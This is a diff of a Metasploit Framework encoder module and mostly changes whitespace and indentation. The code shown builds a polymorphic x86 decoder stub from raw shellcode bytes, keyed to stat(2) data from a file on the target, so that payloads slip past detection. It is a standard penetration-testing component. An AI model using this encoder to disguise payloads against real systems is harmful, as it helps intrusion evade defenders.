@@ -1,5 +1,9 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -33,19 +37,19 @@ class Metasploit3 < Msf::Encoder::XorAdditiveFeedback
 				})
 
 		register_options(
-                                [
-                                OptString.new('STAT_KEY', 
-					[ true, 
-				  	"STAT key from target host (see tools/context/stat-key utility)",
-				  	"0x00000000"]),
-				OptString.new('STAT_FILE', [ true, "name of file to stat(2)", "/bin/ls"]),
-                                ], self.class)   
+			[
+				OptString.new('STAT_KEY',
+					[ true,
+					"STAT key from target host (see tools/context/stat-key utility)",
+					"0x00000000"]),
+			OptString.new('STAT_FILE', [ true, "name of file to stat(2)", "/bin/ls"]),
+                                ], self.class)
 	end
 
-        def obtain_key(buf, badchars, state)
+	def obtain_key(buf, badchars, state)
 		state.key = datastore['STAT_KEY'].hex
 		return state.key
-        end
+	end
 
 	#
 	# Generates the shikata decoder stub.
@@ -65,7 +69,7 @@ class Metasploit3 < Msf::Encoder::XorAdditiveFeedback
 
 			# Cache this decoder stub.  The reason we cache the decoder stub is
 			# because we need to ensure that the same stub is returned every time
-			# for a given encoder state. 
+			# for a given encoder state.
 			state.decoder_stub = block
 		end
 
@@ -78,44 +82,45 @@ protected
 		flen = fname.length
 
 		payload =
-	                "\xd9\xee" +    # fldz
-		"\xd9\x74\x24\xf4" +    # fnstenv -0xc(%esp)
-			    "\x5b" +    # pop %ebx
-    Rex::Arch::X86.jmp_short(flen) +    # jmp over
-			     fname +    # the filename
-		    "\x83\xc3\x09" +    # over: add $9, %ebx
-			"\x8d\x53" +  	# lea filelen(%ebx), %edx
-     Rex::Arch::X86.pack_lsb(flen) +    #
-			"\x31\xc0" +	# xor %eax,%eax
-			"\x88\x02" + 	# mov %al,(%edx)
-		"\x8d\x4c\x24\xa8" +    # lea -0x58(%esp),%ecx
-			"\xb0\xc3" +	# mov $0xc3, %al
-			"\xcd\x80" + 	# int $0x80
-	            "\x8b\x41\x2c" +	# mov 0x2c(%ecx),%eax
-		    "\x33\x41\x48" 	# xor 0x48(%ecx),%eax
+			"\xd9\xee" +            # fldz
+			"\xd9\x74\x24\xf4" +    # fnstenv -0xc(%esp)
+			"\x5b" +                # pop %ebx
+			Rex::Arch::X86.jmp_short(flen) +    # jmp over
+			fname +                 # the filename
+			"\x83\xc3\x09" +        # over: add $9, %ebx
+			"\x8d\x53" +  	         # lea filelen(%ebx), %edx
+			Rex::Arch::X86.pack_lsb(flen) +    #
+			"\x31\xc0" +	         # xor %eax,%eax
+			"\x88\x02" +            # mov %al,(%edx)
+			"\x8d\x4c\x24\xa8" +    # lea -0x58(%esp),%ecx
+			"\xb0\xc3" +            # mov $0xc3, %al
+			"\xcd\x80" +            # int $0x80
+			"\x8b\x41\x2c" +        # mov 0x2c(%ecx),%eax
+			"\x33\x41\x48"          # xor 0x48(%ecx),%eax
 	end
+
 	#
 	# Returns the set of FPU instructions that can be used for the FPU block of
 	# the decoder stub.
 	#
 	def fpu_instructions
 		fpus = []
-	
+
 		0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
 		0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
 		0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
 		0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
 		0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }
-	
+
 		fpus << "\xd9\xd0"
 		fpus << "\xd9\xe1"
 		fpus << "\xd9\xf6"
 		fpus << "\xd9\xf7"
 		fpus << "\xd9\xe5"
-	
+
 		# This FPU instruction seems to fail consistently on Linux
 		#fpus << "\xdb\xe1"
-	
+
 		fpus
 	end
 
@@ -133,11 +138,9 @@ protected
 		endb = Rex::Poly::SymbolicBlock::End.new
 
 		# FPU blocks
-		fpu = Rex::Poly::LogicalBlock.new('fpu',
-			*fpu_instructions)
-		fnstenv = Rex::Poly::LogicalBlock.new('fnstenv',
-			"\xd9\x74\x24\xf4")
-		
+		fpu = Rex::Poly::LogicalBlock.new('fpu', *fpu_instructions)
+		fnstenv = Rex::Poly::LogicalBlock.new('fnstenv', "\xd9\x74\x24\xf4")
+
 		# Get EIP off the stack
 		popeip = Rex::Poly::LogicalBlock.new('popeip',
 			Proc.new { |b| (0x58 + b.regnum_of(addr_reg)).chr })
@@ -164,7 +167,7 @@ protected
 		end
 
 		# Key initialization block
-		
+
 		# Decoder loop block
 		loop_block = Rex::Poly::LogicalBlock.new('loop_block')
 
@@ -184,9 +187,9 @@ protected
 			Proc.new { |b| xor1.call(b) + add1.call(b) + add4.call(b) },
 			Proc.new { |b| xor1.call(b) + add4.call(b) + add2.call(b) },
 			Proc.new { |b| add4.call(b) + xor2.call(b) + add2.call(b) })
-		
+
 		# Loop instruction block
-		loop_inst = Rex::Poly::LogicalBlock.new('loop_inst', 
+		loop_inst = Rex::Poly::LogicalBlock.new('loop_inst',
 			"\xe2\xf5")
 
 		# Define block dependencies
